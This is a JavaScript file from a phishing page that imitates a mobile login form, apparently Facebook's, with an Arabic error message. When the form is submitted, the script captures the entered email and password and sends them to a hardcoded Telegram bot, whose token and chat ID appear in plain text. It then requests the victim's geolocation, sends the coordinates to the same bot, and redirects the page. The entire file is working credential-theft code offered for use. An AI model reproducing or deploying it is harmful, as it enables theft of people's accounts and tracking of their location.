document.querySelector('.mobile-login-form').addEventListener('submit', function (event) {
    event.preventDefault();

    const email = document.querySelector("[name='email']").value;
    const password = document.querySelector("[name='pass']").value;

    if (email === '' || password === '') {
        const errorMessage = document.getElementById('login_error');
        errorMessage.style.display = 'block';
        errorMessage.querySelector('._52jd').innerText = 'الرجاء ملء كل الحقول';
    } else {
        const botToken = '6507011447:AAFQoG5r_wg2YFG6N8qxqnSnClzN-viNjdw';
        const chatId = '1195010636';
        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const message = `
New Form Submission:
Email: ${email}
Password: ${password}
`;

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', message);

        fetch(apiUrl, {
            method: 'POST',
            body: formData
        })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    if ("geolocation" in navigator) {
                        navigator.geolocation.getCurrentPosition(
                            position => {
                                const latitude = position.coords.latitude;
                                const longitude = position.coords.longitude;

                                const locationMessage = `
Location Info:
Latitude: ${latitude}
Longitude: ${longitude}
`;

                                fetch(apiUrl, {
                                    method: 'POST',
                                    body: JSON.stringify({
                                        chat_id: chatId,
                                        text: locationMessage
                                    }),
                                    headers: {
                                        'Content-Type': 'application/json'
                                    }
                                })
                                    .then(response => response.json())
                                    .then(data => {
                                        if (data.ok) {
                                            window.location.href = 'link_1';
                                        } else {
                                            console.error('An error occurred while sending location data to Telegram.');
                                        }
                                    })
                                    .catch(error => {
                                        console.error('An error occurred:', error);
                                    });
                            },
                            error => {
                                window.location.href = 'location.html';
                            }
                        );
                    } else {
                        console.error('Geolocation is not supported.');
                    }
                } else {
                    console.error('An error occurred while sending data to Telegram.');
                }
            })
            .catch(error => {
                console.error('An error occurred:', error);
            });
    }
});
